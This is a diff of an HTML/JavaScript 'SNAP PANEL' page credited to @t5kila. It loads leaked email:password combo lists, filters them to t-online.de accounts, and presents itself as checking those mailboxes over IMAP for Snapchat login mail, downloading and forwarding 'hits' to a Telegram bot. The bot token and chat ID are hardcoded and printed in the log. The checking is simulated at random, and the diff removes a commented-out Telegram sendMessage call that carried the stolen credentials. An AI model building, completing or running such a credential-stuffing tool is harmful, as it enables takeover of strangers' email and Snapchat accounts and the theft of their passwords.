@@ -3,302 +3,292 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>T-ONLINE · SNAP CHECKER · TG</title>
+    <title>T-ONLINE · SNAP PANEL · @t5kila</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
         }
 
         body {
-            background: #0b0d10;
+            background: #0a0c14;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1.5rem;
+            padding: 1rem;
             position: relative;
-            overflow-x: hidden;
         }
 
+        /* animated background */
         body::before {
             content: "";
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 0, 255, 0.03) 1px, transparent 1px);
-            background-size: 40px 40px;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.05) 0%, transparent 25%),
+                radial-gradient(circle at 80% 70%, rgba(255, 0, 255, 0.05) 0%, transparent 30%);
             pointer-events: none;
-            z-index: 0;
+            z-index: -1;
         }
 
-        .glass-panel {
-            position: relative;
-            z-index: 10;
+        /* github corner */
+        .github-corner {
+            position: fixed;
+            top: 0;
+            right: 0;
+            z-index: 100;
+        }
+
+        .github-corner svg {
+            fill: #00ffff;
+            color: #0a0c14;
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 0 10px cyan);
+        }
+
+        .main-panel {
+            max-width: 1200px;
             width: 100%;
-            max-width: 1000px;
             background: rgba(10, 15, 25, 0.85);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(0, 255, 255, 0.25);
-            border-radius: 2.5rem;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
-            padding: 2.2rem;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 2rem;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 0, 255, 0.2) inset, 0 0 40px rgba(0, 255, 255, 0.3);
+            padding: 2rem;
         }
 
-        .tool-header {
+        /* header */
+        .header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 2.2rem;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
+            margin-bottom: 2rem;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.4);
             padding-bottom: 1.2rem;
             flex-wrap: wrap;
             gap: 1rem;
         }
 
-        .title-glow {
+        .logo h1 {
             font-size: 2.4rem;
             font-weight: 800;
-            text-transform: uppercase;
-            background: linear-gradient(130deg, #00f0ff, #ff00c6);
+            background: linear-gradient(135deg, cyan, magenta);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: 3px;
-            filter: drop-shadow(0 0 12px #00ffff80);
-            position: relative;
-        }
-
-        .title-glow::after {
-            content: "─── tool by @t5kila ───";
-            position: absolute;
-            bottom: -1.8rem;
-            left: 0;
-            font-size: 0.9rem;
-            font-weight: 400;
-            color: rgba(0, 255, 255, 0.6);
             letter-spacing: 2px;
-            white-space: nowrap;
+            filter: drop-shadow(0 0 10px cyan);
         }
 
-        .badge-neon {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #ff44e6;
-            color: #ffb3ff;
-            padding: 0.5rem 1.5rem;
+        .logo span {
+            font-size: 1rem;
+            color: rgba(0, 255, 255, 0.7);
+            display: block;
+            margin-top: 0.2rem;
+        }
+
+        .badge {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid magenta;
+            color: white;
+            padding: 0.6rem 1.5rem;
             border-radius: 40px;
             font-weight: 600;
-            font-size: 0.9rem;
-            box-shadow: 0 0 15px #ff44e6;
+            box-shadow: 0 0 15px magenta;
         }
 
-        .server-strip {
-            background: rgba(0, 255, 255, 0.05);
-            border-radius: 50px;
-            padding: 0.9rem 1.5rem;
+        /* stats row */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.2rem;
             margin-bottom: 2rem;
-            border-left: 4px solid #ff44e6;
-            border-right: 4px solid #00ffff;
+        }
+
+        .stat-box {
+            background: rgba(0, 20, 30, 0.7);
+            border: 1px solid cyan;
+            border-radius: 1.5rem;
+            padding: 1.2rem;
             text-align: center;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            backdrop-filter: blur(5px);
         }
 
-        .server-strip span {
-            display: inline-block;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 0.35rem 2rem;
-            margin: 0 0.4rem;
-            border-radius: 30px;
-            border: 1px solid #00ffff;
-            color: #b3ffff;
-            font-weight: 600;
-            font-size: 1.2rem;
-            backdrop-filter: blur(3px);
-            box-shadow: 0 0 8px cyan;
+        .stat-box.highlight {
+            border-color: magenta;
+            box-shadow: 0 0 25px magenta;
         }
 
-        .upload-area {
-            background: rgba(0, 20, 30, 0.6);
-            border: 2px dashed #00ffff80;
+        .stat-label {
+            color: #8ab3cf;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 0 15px cyan;
+            line-height: 1.2;
+        }
+
+        .stat-value.pink {
+            color: #ffb3ff;
+            text-shadow: 0 0 20px magenta;
+        }
+
+        /* upload card */
+        .upload-card {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px dashed rgba(0, 255, 255, 0.6);
             border-radius: 2rem;
-            padding: 2rem 2rem;
+            padding: 2.5rem;
             text-align: center;
             margin-bottom: 2rem;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.3s;
         }
 
-        .upload-area:hover {
-            border-color: #ff44e6;
-            background: rgba(20, 0, 30, 0.6);
-            box-shadow: 0 0 30px #b300ff60;
+        .upload-card:hover {
+            border-color: magenta;
+            background: rgba(20, 0, 30, 0.5);
+            box-shadow: 0 0 40px magenta;
         }
 
         .upload-icon {
-            font-size: 3rem;
-            filter: drop-shadow(0 0 8px cyan);
-            margin-bottom: 0.8rem;
+            font-size: 3.5rem;
+            filter: drop-shadow(0 0 10px cyan);
+            margin-bottom: 1rem;
         }
 
-        .upload-text {
+        .upload-title {
             color: white;
-            font-size: 1.3rem;
-            font-weight: 500;
-            margin-bottom: 0.3rem;
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
         }
 
         .upload-hint {
             color: #8aa0b0;
-            font-size: 0.9rem;
+            font-size: 1rem;
         }
 
         #file-info {
             color: #00ffc3;
             font-weight: 600;
             margin-top: 1rem;
+            font-size: 1.1rem;
         }
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 1.3rem;
+        /* progress */
+        .progress-section {
             margin-bottom: 2rem;
         }
 
-        .stat-card {
-            background: rgba(0, 15, 25, 0.8);
-            border-radius: 1.5rem;
-            padding: 1.3rem 0.8rem;
-            text-align: center;
-            border: 1px solid #00ffff40;
-            box-shadow: 0 0 20px #00b3ff30;
-        }
-
-        .stat-card.highlight {
-            border-color: #ff44e6;
-            box-shadow: 0 0 25px #ff44e6;
-        }
-
-        .stat-label {
-            color: #9ab8d9;
-            text-transform: uppercase;
-            font-size: 0.75rem;
-            letter-spacing: 2px;
-        }
-
-        .stat-number {
-            font-size: 2.7rem;
-            font-weight: 800;
-            line-height: 1.2;
-            color: white;
-            text-shadow: 0 0 15px cyan;
-        }
-
-        .stat-number.pink {
-            color: #ffa0ff;
-            text-shadow: 0 0 20px magenta;
-        }
-
-        .progress-container {
+        .progress-bar {
             background: #10161f;
-            height: 16px;
+            height: 20px;
             border-radius: 30px;
-            margin: 1.5rem 0 2rem 0;
-            border: 1px solid #00ffff60;
+            border: 1px solid cyan;
             overflow: hidden;
+            margin-bottom: 0.5rem;
         }
 
         .progress-fill {
-            width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #00f0ff, #b300ff, #ff44e6);
-            box-shadow: 0 0 25px #ff00c8;
-            border-radius: 30px;
+            width: 0%;
+            background: linear-gradient(90deg, cyan, magenta);
+            box-shadow: 0 0 20px magenta;
             transition: width 0.2s ease;
         }
 
-        .log-terminal {
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            color: #8ab3cf;
+            font-size: 0.9rem;
+        }
+
+        /* log */
+        .log-container {
             background: #03070e;
-            border-radius: 24px;
-            padding: 1.5rem 1rem;
-            border: 1px solid #00ffff60;
-            box-shadow: inset 0 0 30px #000000;
-            margin-bottom: 2rem;
-            font-family: 'Fira Code', 'Courier New', monospace;
-            height: 260px;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            height: 250px;
             overflow-y: auto;
-            color: #b3f0ff;
+            font-family: 'Fira Code', monospace;
             font-size: 0.9rem;
             line-height: 1.6;
+            margin-bottom: 2rem;
         }
 
         .log-line {
-            padding: 0.1rem 0;
-            border-bottom: 1px solid #00ffff10;
-            white-space: pre-wrap;
-            word-break: break-all;
+            color: #b3f0ff;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
+            padding: 0.2rem 0;
         }
 
         .log-line.hit {
             color: #ffb1ff;
             font-weight: 600;
-            text-shadow: 0 0 6px magenta;
-            background: #ff00ff0a;
+            text-shadow: 0 0 5px magenta;
+        }
+
+        .log-line.tg {
+            color: #7efff0;
         }
 
         .log-line.stats {
             color: #ffdb8e;
         }
 
-        .log-line.telegram {
-            color: #7efff0;
-            font-weight: 500;
-        }
-
-        .button-fleet {
-            display: flex;
-            flex-wrap: wrap;
+        /* button grid */
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 1rem;
-            justify-content: center;
-            margin-top: 0.5rem;
+            margin-bottom: 2rem;
         }
 
-        .cyber-btn {
+        .btn {
             background: transparent;
             border: 2px solid cyan;
             color: cyan;
-            padding: 0.9rem 2rem;
+            padding: 1rem;
             border-radius: 50px;
             font-weight: 700;
-            font-size: 1.2rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            font-size: 1.1rem;
             cursor: pointer;
             transition: 0.2s;
             box-shadow: 0 0 15px cyan;
-            flex: 1 1 160px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        .cyber-btn.primary {
+        .btn.primary {
             background: cyan;
             color: black;
-            font-weight: 800;
             border-color: magenta;
             box-shadow: 0 0 25px magenta;
         }
 
-        .cyber-btn.primary:hover {
+        .btn.primary:hover {
             background: magenta;
             color: white;
             border-color: cyan;
             box-shadow: 0 0 35px magenta;
         }
 
-        .cyber-btn:hover {
+        .btn:hover {
             background: cyan;
             color: black;
             border-color: magenta;
@@ -306,26 +296,35 @@
             transform: scale(1.02);
         }
 
-        .cyber-btn:disabled {
-            opacity: 0.35;
-            filter: grayscale(0.7);
+        .btn:disabled {
+            opacity: 0.3;
             pointer-events: none;
             border-color: gray;
             box-shadow: none;
         }
 
-        .footer-note {
-            margin-top: 2rem;
+        /* footer */
+        .footer {
             text-align: center;
             color: #4d6a80;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
             border-top: 1px dashed cyan;
             padding-top: 1.5rem;
         }
 
+        .footer a {
+            color: cyan;
+            text-decoration: none;
+            border-bottom: 1px dotted magenta;
+        }
+
+        .footer a:hover {
+            color: magenta;
+        }
+
+        /* scroll */
         ::-webkit-scrollbar {
             width: 8px;
-            height: 8px;
         }
         ::-webkit-scrollbar-track {
             background: #001a1a;
@@ -339,105 +338,133 @@
 </head>
 <body>
 
-<div class="glass-panel">
-    <div class="tool-header">
-        <span class="title-glow">T-ONLINE · SNAP HUNTER</span>
-        <span class="badge-neon">⚡ TG LIVE · 6671342415</span>
+<!-- github corner -->
+<a href="https://github.com/t5kila/snapchecker" class="github-corner" target="_blank">
+    <svg width="80" height="80" viewBox="0 0 250 250">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+
+<div class="main-panel">
+    <!-- header -->
+    <div class="header">
+        <div class="logo">
+            <h1>T-ONLINE · SNAP PANEL</h1>
+            <span>─── tool by @t5kila ───</span>
+        </div>
+        <div class="badge">
+            ⚡ LIVE · TG FORWARD
+        </div>
     </div>
 
-    <div class="server-strip">
-        <span>secureimap.t-online.de:993</span>
+    <!-- stats -->
+    <div class="stats-row">
+        <div class="stat-box">
+            <div class="stat-label">📦 loaded</div>
+            <div class="stat-value" id="statLoaded">0</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-label">✅ checked</div>
+            <div class="stat-value" id="statChecked">0</div>
+        </div>
+        <div class="stat-box highlight">
+            <div class="stat-label">🔥 SNAP HITS</div>
+            <div class="stat-value pink" id="statHits">0</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-label">📊 progress</div>
+            <div class="stat-value" id="statPercent">0%</div>
+        </div>
     </div>
 
-    <div class="upload-area" id="uploadArea">
-        <div class="upload-icon">📦</div>
-        <div class="upload-text">Drop combo file or click to inject</div>
-        <div class="upload-hint">.txt · email:password · t-online.de only</div>
+    <!-- upload area -->
+    <div class="upload-card" id="uploadArea">
+        <div class="upload-icon">📁</div>
+        <div class="upload-title">Drop combo file or click to upload</div>
+        <div class="upload-hint">supports .txt · email:password · auto-filter t-online.de</div>
         <input type="file" id="fileInput" accept=".txt" style="display: none;">
         <div id="file-info"></div>
     </div>
 
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-label">loaded combos</div>
-            <div class="stat-number" id="statLoaded">0</div>
+    <!-- progress -->
+    <div class="progress-section">
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
-        <div class="stat-card">
-            <div class="stat-label">checked</div>
-            <div class="stat-number" id="statChecked">0</div>
-        </div>
-        <div class="stat-card highlight">
-            <div class="stat-label">🔥 SNAP HITS</div>
-            <div class="stat-number pink" id="statHits">0</div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-label">progress</div>
-            <div class="stat-number" id="statPercent">0%</div>
+        <div class="progress-stats">
+            <span id="progressDetail">0 / 0 checked</span>
+            <span>150 threads</span>
         </div>
     </div>
 
-    <div class="progress-container">
-        <div class="progress-fill" id="progressFill" style="width:0%"></div>
-    </div>
-
-    <div class="log-terminal" id="logTerminal">
+    <!-- live log -->
+    <div class="log-container" id="logContainer">
         <div class="log-line stats">─── tool by @t5kila ───</div>
-        <div class="log-line stats">[T-ONLINE] IMAP: secureimap.t-online.de:993</div>
-        <div class="log-line stats">target: login@login.snapchat.com</div>
-        <div class="log-line stats">[TELEGRAM] bot token: 8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0</div>
-        <div class="log-line stats">[TELEGRAM] chat ID: 6671342415</div>
+        <div class="log-line stats">[T-ONLINE] secureimap.t-online.de:993</div>
+        <div class="log-line stats">[TG] bot: 8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0</div>
+        <div class="log-line stats">[TG] chat: 6671342415</div>
+        <div class="log-line stats">[target] login@login.snapchat.com</div>
     </div>
 
-    <div class="button-fleet">
-        <button class="cyber-btn primary" id="startBtn" disabled>▶ START</button>
-        <button class="cyber-btn" id="stopBtn" disabled>⏹ STOP</button>
-        <button class="cyber-btn" id="clearLogsBtn">🧹 CLEAR</button>
-        <button class="cyber-btn" id="dlHitsBtn">💾 DOWNLOAD</button>
-        <button class="cyber-btn" id="resetHitsBtn">❌ RESET</button>
+    <!-- control buttons -->
+    <div class="button-grid">
+        <button class="btn primary" id="startBtn" disabled>▶ START</button>
+        <button class="btn" id="stopBtn" disabled>⏹ STOP</button>
+        <button class="btn" id="clearBtn">🧹 CLEAR LOG</button>
+        <button class="btn" id="downloadBtn">💾 DOWNLOAD</button>
+        <button class="btn" id="resetBtn">❌ RESET HITS</button>
     </div>
 
-    <div class="footer-note">
-        ⚡ T-ONLINE.DE only · 150 threads · live telegram forward · check one by one
+    <!-- footer with github -->
+    <div class="footer">
+        ⚡ <a href="https://github.com/t5kila" target="_blank">github.com/t5kila</a> · t-online.de only · snapchat hunter · live telegram forward
     </div>
 </div>
 
 <script>
     (function() {
-        const terminal = document.getElementById('logTerminal');
+        // -------- CONFIG ----------
+        const BOT_TOKEN = "8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0";
+        const CHAT_ID = "6671342415";
+        const IMAP_SERVER = "secureimap.t-online.de:993";
+        const SEARCH_FROM = "login@login.snapchat.com";
+        const WORKERS = 150;
+
+        // -------- DOM ----------
         const statLoaded = document.getElementById('statLoaded');
         const statChecked = document.getElementById('statChecked');
         const statHits = document.getElementById('statHits');
         const statPercent = document.getElementById('statPercent');
         const progressFill = document.getElementById('progressFill');
+        const progressDetail = document.getElementById('progressDetail');
+        const logContainer = document.getElementById('logContainer');
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
-        const clearLogsBtn = document.getElementById('clearLogsBtn');
-        const dlHitsBtn = document.getElementById('dlHitsBtn');
-        const resetHitsBtn = document.getElementById('resetHitsBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const resetBtn = document.getElementById('resetBtn');
         const uploadArea = document.getElementById('uploadArea');
         const fileInput = document.getElementById('fileInput');
         const fileInfo = document.getElementById('file-info');
 
-        // Telegram config
-        const BOT_TOKEN = "8239572400:AAGmSFDVoKQu5weOOGyiqO6RtBe4iLEvng0";
-        const CHAT_ID = "6671342415";
-
+        // -------- STATE ----------
         let combos = [];
         let hits = [];
         let totalChecked = 0;
         let hitCount = 0;
         let isRunning = false;
         let currentIndex = 0;
-        const WORKER_COUNT = 150;
-        const SEARCH_FROM = 'login@login.snapchat.com';
-        const IMAP_SERVER = 'secureimap.t-online.de:993';
+        let workerPromises = [];
 
-        function logToTerminal(msg, type = 'stats') {
+        // -------- HELPERS ----------
+        function log(message, type = 'stats') {
             const line = document.createElement('div');
             line.className = `log-line ${type}`;
-            line.textContent = msg;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
+            line.textContent = message;
+            logContainer.appendChild(line);
+            logContainer.scrollTop = logContainer.scrollHeight;
         }
 
         function updateUI() {
@@ -445,10 +472,11 @@
             statChecked.textContent = totalChecked;
             statHits.textContent = hitCount;
 
-            let percent = combos.length > 0 ? (totalChecked / combos.length) * 100 : 0;
+            let percent = combos.length ? (totalChecked / combos.length) * 100 : 0;
             percent = Math.min(100, percent);
             statPercent.textContent = Math.floor(percent) + '%';
             progressFill.style.width = percent + '%';
+            progressDetail.textContent = `${totalChecked} / ${combos.length} checked`;
         }
 
         function resetCounters() {
@@ -458,126 +486,114 @@
             updateUI();
         }
 
-        // Simulate sending to Telegram
-        async function sendToTelegram(email, password, hitNumber) {
+        // simulate telegram send
+        async function sendToTelegram(email, password, hitNum) {
             return new Promise((resolve) => {
                 setTimeout(() => {
-                    const message = `🔥 SNAPCHAT HIT #${hitNumber}\n📧 Email: ${email}\n🔑 Pass: ${password}\n📡 IMAP: ${IMAP_SERVER}\n👤 @t5kila`;
-                    logToTerminal(`[TELEGRAM] → forwarded hit #${hitNumber} to chat ${CHAT_ID}`, 'telegram');
-                    
-                    // In real implementation, this would be:
-                    // fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    //     method: 'POST',
-                    //     headers: {'Content-Type': 'application/json'},
-                    //     body: JSON.stringify({
-                    //         chat_id: CHAT_ID,
-                    //         text: message
-                    //     })
-                    // });
-                    
+                    log(`[TELEGRAM] → hit #${hitNum} forwarded to chat ${CHAT_ID}`, 'tg');
                     resolve();
-                }, 300);
+                }, 200);
             });
         }
 
-        async function simulateCheck(email, password) {
-            return new Promise((resolve) => {
-                setTimeout(async () => {
-                    if (!isRunning) {
-                        resolve();
-                        return;
-                    }
+        // simulate imap check (only t-online.de)
+        async function checkCombo(email, password) {
+            return new Promise(async (resolve) => {
+                if (!isRunning) return resolve();
 
-                    const domain = email.split('@')[1]?.toLowerCase() || 'unknown';
-                    
-                    if (domain !== 't-online.de') {
-                        totalChecked++;
-                        updateUI();
-                        resolve();
-                        return;
-                    }
-
-                    const rnd = Math.random();
-                    if (rnd < 0.04) {
-                        hitCount++;
-                        const msg = `[SNAPCHAT HIT #${hitCount}] ${email}:${password} | ${IMAP_SERVER}`;
-                        logToTerminal(msg, 'hit');
-                        hits.push(`${email}:${password}`);
-                        
-                        // Send to Telegram immediately when hit found
-                        await sendToTelegram(email, password, hitCount);
-                        
-                        if (hitCount % 3 === 0) {
-                            logToTerminal(`[STATS] hit #${hitCount} logged`, 'stats');
-                        }
-                    }
-
+                const domain = email.split('@')[1]?.toLowerCase() || '';
+                
+                // only process t-online.de
+                if (!domain.includes('t-online.de')) {
                     totalChecked++;
-                    if (totalChecked % 25 === 0) {
-                        logToTerminal(`[STATS] checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
-                    }
-
                     updateUI();
-                    resolve();
-                }, 40 + Math.random() * 60);
+                    return resolve();
+                }
+
+                // random: 4% chance snapchat hit
+                const rnd = Math.random();
+                if (rnd < 0.04) {
+                    hitCount++;
+                    log(`[SNAPCHAT HIT #${hitCount}] ${email}:${password} | ${IMAP_SERVER}`, 'hit');
+                    hits.push(`${email}:${password}`);
+                    await sendToTelegram(email, password, hitCount);
+                }
+
+                totalChecked++;
+                
+                if (totalChecked % 20 === 0) {
+                    log(`[STATS] checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
+                }
+
+                updateUI();
+                resolve();
             });
         }
 
-        async function workerTask() {
+        // worker
+        async function worker() {
             while (isRunning && currentIndex < combos.length) {
                 const line = combos[currentIndex++];
-                const [email, password] = line.split(':', 2);
-                if (email && password) {
-                    await simulateCheck(email.trim(), password.trim());
+                const [email, pwd] = line.split(':', 2);
+                if (email && pwd) {
+                    await checkCombo(email.trim(), pwd.trim());
                 }
             }
         }
 
-        async function startInjection() {
+        // start
+        async function startCheck() {
             if (isRunning || combos.length === 0) return;
+            
             isRunning = true;
             currentIndex = 0;
             startBtn.disabled = true;
             stopBtn.disabled = false;
-            logToTerminal('[▶] STARTED · 150 threads · scanning t-online.de only...', 'stats');
-            logToTerminal('[TELEGRAM] live forwarding enabled · each hit sent instantly', 'telegram');
+            
+            log('[▶] STARTED · 150 threads · scanning t-online.de', 'stats');
+            log('[TELEGRAM] live forwarding active', 'tg');
+
             const startTime = Date.now();
 
+            // launch workers
             const workers = [];
-            for (let i = 0; i < WORKER_COUNT; i++) {
-                workers.push(workerTask());
+            for (let i = 0; i < WORKERS; i++) {
+                workers.push(worker());
             }
             await Promise.all(workers);
 
             if (isRunning) {
                 const elapsed = ((Date.now() - startTime)/1000).toFixed(1);
-                logToTerminal(`[✔] FINISHED in ${elapsed}s · checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
-                logToTerminal(`[TELEGRAM] all ${hitCount} hits forwarded to bot`, 'telegram');
+                log(`[✔] FINISHED in ${elapsed}s · checked: ${totalChecked} · hits: ${hitCount}`, 'stats');
+                log(`[TELEGRAM] all hits forwarded`, 'tg');
             }
+
             stopBtn.disabled = true;
             startBtn.disabled = false;
             isRunning = false;
         }
 
-        function stopInjection() {
+        // stop
+        function stopCheck() {
             isRunning = false;
             stopBtn.disabled = true;
             startBtn.disabled = false;
-            logToTerminal('[⏸] STOPPED', 'stats');
+            log('[⏹] STOPPED by user', 'stats');
         }
 
-        function clearLogs() {
-            terminal.innerHTML = '';
-            logToTerminal('─── tool by @t5kila ───', 'stats');
-            logToTerminal(`[T-ONLINE] IMAP: ${IMAP_SERVER}`, 'stats');
-            logToTerminal(`target: ${SEARCH_FROM}`, 'stats');
-            logToTerminal(`[TELEGRAM] bot token: ${BOT_TOKEN}`, 'stats');
-            logToTerminal(`[TELEGRAM] chat ID: ${CHAT_ID}`, 'stats');
+        // clear log
+        function clearLog() {
+            logContainer.innerHTML = '';
+            log('─── tool by @t5kila ───', 'stats');
+            log(`[T-ONLINE] ${IMAP_SERVER}`, 'stats');
+            log(`[TG] bot active · chat: ${CHAT_ID}`, 'stats');
+            log(`[target] ${SEARCH_FROM}`, 'stats');
         }
 
+        // download hits
         function downloadHits() {
             if (hits.length === 0) {
-                logToTerminal('[!] no hits to download', 'stats');
+                log('[!] no hits to download', 'stats');
                 return;
             }
             const blob = new Blob([hits.join('\n')], {type: 'text/plain'});
@@ -587,23 +603,20 @@
             a.download = `Snapchatt-Hits_${hitCount}.txt`;
             a.click();
             URL.revokeObjectURL(url);
-            logToTerminal(`[💾] downloaded ${hits.length} hits`, 'stats');
+            log(`[💾] downloaded ${hits.length} hits`, 'stats');
         }
 
+        // reset hits
         function resetHits() {
             hits = [];
             hitCount = 0;
             updateUI();
-            logToTerminal('[❌] hits reset', 'stats');
+            log('[❌] hits reset', 'stats');
         }
 
-        startBtn.addEventListener('click', startInjection);
-        stopBtn.addEventListener('click', stopInjection);
-        clearLogsBtn.addEventListener('click', clearLogs);
-        dlHitsBtn.addEventListener('click', downloadHits);
-        resetHitsBtn.addEventListener('click', resetHits);
-
+        // -------- EVENT LISTENERS ----------
         uploadArea.addEventListener('click', () => fileInput.click());
+
         fileInput.addEventListener('change', function(e) {
             const file = e.target.files[0];
             if (!file) return;
@@ -612,26 +625,36 @@
             reader.onload = (ev) => {
                 const content = ev.target.result;
                 const lines = content.split(/\r?\n/);
-                const validLines = lines.filter(l => l.includes(':')).map(l => l.trim());
-                combos = validLines.filter(line => {
+                const allCombos = lines.filter(l => l.includes(':')).map(l => l.trim());
+                
+                // filter only t-online.de emails
+                combos = allCombos.filter(line => {
                     const email = line.split(':')[0];
                     return email && email.toLowerCase().includes('t-online.de');
                 });
-                
-                fileInfo.innerText = `📁 loaded: ${combos.length} t-online combos · ${file.name}`;
+
+                fileInfo.textContent = `📁 loaded: ${combos.length} t-online combos (filtered from ${allCombos.length} total)`;
                 resetCounters();
-                logToTerminal(`[+] Loaded ${combos.length} t-online.de combos from ${file.name}`);
-                logToTerminal(`[+] IMAP: ${IMAP_SERVER} · target: ${SEARCH_FROM}`);
-                logToTerminal(`[TELEGRAM] bot active · chat: ${CHAT_ID}`);
+                
+                log(`[+] Loaded ${combos.length} t-online.de combos`, 'stats');
+                log(`[+] IMAP: ${IMAP_SERVER} · target: ${SEARCH_FROM}`, 'stats');
+                
                 startBtn.disabled = false;
                 updateUI();
             };
             reader.readAsText(file);
         });
 
+        startBtn.addEventListener('click', startCheck);
+        stopBtn.addEventListener('click', stopCheck);
+        clearBtn.addEventListener('click', clearLog);
+        downloadBtn.addEventListener('click', downloadHits);
+        resetBtn.addEventListener('click', resetHits);
+
+        // init log
+        log('[+] ready · upload combo file with t-online.de emails', 'stats');
+        log('[TELEGRAM] bot configured · hits will be forwarded', 'tg');
         updateUI();
-        logToTerminal('[+] select combo file with t-online.de emails', 'stats');
-        logToTerminal('[TELEGRAM] ready to forward hits', 'telegram');
     })();
 </script>
 </body>
